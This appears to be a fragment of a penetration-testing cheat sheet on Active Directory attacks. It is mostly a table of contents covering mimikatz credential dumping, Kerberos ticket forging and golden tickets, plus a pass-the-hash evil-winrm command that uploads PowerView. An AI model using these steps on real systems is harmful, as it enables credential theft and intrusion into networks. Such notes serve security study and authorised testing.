...
- [OR](#or)
          - [](#)
- [OR](#or-1)
- [1 - mimikatz - extract credentials](#1---mimikatz---extract-credentials)
- [2 - kekeo - generate TGT](#2---kekeo---generate-tgt)
- [3 - mimikatz - import tickets](#3---mimikatz---import-tickets)
- [klist](#klist)
- [check if tickets were imported](#check-if-tickets-were-imported)
- [Execute](#execute)
- [Execute: create interactive session](#execute-create-interactive-session)
- [](#-1)
- [Create service](#create-service)
- [Legacy](#legacy)
- [Create](#create)
- [handle](#handle)
- [Payload must be split in Command and Args](#payload-must-be-split-in-command-and-args)
- [Execute](#execute-1)
- [Legacy](#legacy-1)
- [mimikatz.exe](#mimikatzexe)
- [for extracting hash from local SAM](#for-extracting-hash-from-local-sam)
- [for extracting hash from LSAAS memory](#for-extracting-hash-from-lsaas-memory)
- [with the hash](#with-the-hash)
- [.vbs](#vbs)
- [.exe](#exe)
- [no logged off RDP session](#no-logged-off-rdp-session)
- [Golden ticket](#golden-ticket)
- [/admin](#admin)
- [/domain](#domain)
- [/ptt: inject in the current session](#ptt-inject-in-the-current-session)
- [Checking if ticket is running](#checking-if-ticket-is-running)
...
## Enumeration
- whoami /priv = identify privileges
...
- [belane/docker-bloodhound](https://github.com/belane/docker-bloodhound)
```
...
- evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH
  - upload powerview.ps1, powermad.ps1
  - import-module *.ps1
